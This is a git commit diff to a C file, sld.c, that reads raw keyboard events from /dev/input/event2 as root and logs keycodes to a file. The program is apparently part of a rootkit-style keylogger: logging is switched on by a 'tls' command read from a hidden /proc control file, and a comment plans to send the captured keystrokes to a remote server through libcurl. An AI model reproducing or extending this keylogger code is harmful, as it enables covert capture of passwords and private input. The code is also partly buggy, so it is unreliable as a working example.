f12d5ff81bd52aadc9c02f4365c47c0040c770ee
cara marie <cara.marie@me.com>
2013-08-08 21:03:17 -0700

    moar moar testing

--- sld.c
+++ sld.c
@@ -11,16 +11,11 @@
 #include <time.h>
 #include <fcntl.h>
 
-// #define MAX(a,b) \
-//    ({ typeof (a) _a = (a); \
-//       typeof (b) _b = (b); \
-//      _a < _b ? _a : _b; })		/* typesafe macro for retrieving the max value */
-
 
 int main(void) {
 	FILE *fp = NULL;
 	FILE *evlog;
-	FILE *ftty;
+	int ftty;
 	int fd;
 	int dir;
 	struct utsname unameData;
@@ -60,15 +55,15 @@ int main(void) {
 
 // MAKE ALL FILES AND DIRECTORIES WITH PREFIX RT !!!!!!!!!!
 	dir = mkdir("./log", S_IRWXU);				/* log directory */
-	fp = fopen("./log/log.txt", "a+"); 		/* daemon log */
+	fp = fopen("./log/log.txt", "a+"); 			/* daemon log */
 	evlog = fopen("./log/evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
-	ftty = fopen("/proc/colonel","r");			/* will act as pseudo terminal */
+	ftty = open("/proc/cpuinfo", O_RDONLY);		/* will act as pseudo terminal */
 	
 	time_t curtime;
 	time(&curtime);
 	if (!ftty) {
-		fprintf(fp, "%s -- ERROR: /proc/colonel not found", ctime(&curtime));
+		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
 		return 1;
 	}
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
@@ -77,11 +72,11 @@ int main(void) {
 * Send file out via libcurl to python server for translation
 */	
 	if (geteuid() != 0) {							/* check if user is root */
-		fprintf(fp, "%s -- ERROR: user not root\n", ctime(&curtime));
+		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
 		return 1;
 	}
 	if (NULL == evlog) {
-		fprintf(fp, "%s -- ERROR: evlog couldn't be opened\n", ctime(&curtime));
+		fprintf(fp, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
 		return 1;
 	}
 
@@ -91,24 +86,24 @@ int main(void) {
 			unameData.sysname, unameData.release, 
 			unameData.machine);
 
-	while(1) {
-		fgets(cmd, sizeof(cmd), ftty);
-		// int len = strlen(cmd) -1;
-		// if ('\n' == cmd[len]) {			/* strips newline */
-		// 	cmd[len] = 0;
-		// }
-		if (!strncmp(cmd, "tls", sizeof(strlen(cmd)))) {
-			listening = !listening;
-			fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
-		}
-	}
-
 	/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: up, 1: down)*/
 	while(1) {
 		fflush(fp);
-		read(fd, &ev, sizeof(struct input_event));
-		if(1 == ev.type && listening) {
-		// if(1 == ev.type) {
+		read(fd, &ev, sizeof(struct input_event));		/* read from /dev/input/eventX */
+		
+		if (0 == listening) {
+			read(ftty, cmd, sizeof(cmd));				/* read from /proc/colonel */
+			if (!strncmp(cmd, "tls", sizeof(strlen(cmd)))) {
+				listening = !listening;
+				fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
+				close(ftty);
+				continue;
+			}
+
+		} else if ((1 == ev.type) && (1 == listening)) {
+			ftty = open("/proc/cpuinfo", O_RDONLY | O_NONBLOCK);
+			read(ftty, cmd, sizeof(cmd));
+
 			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
 		}
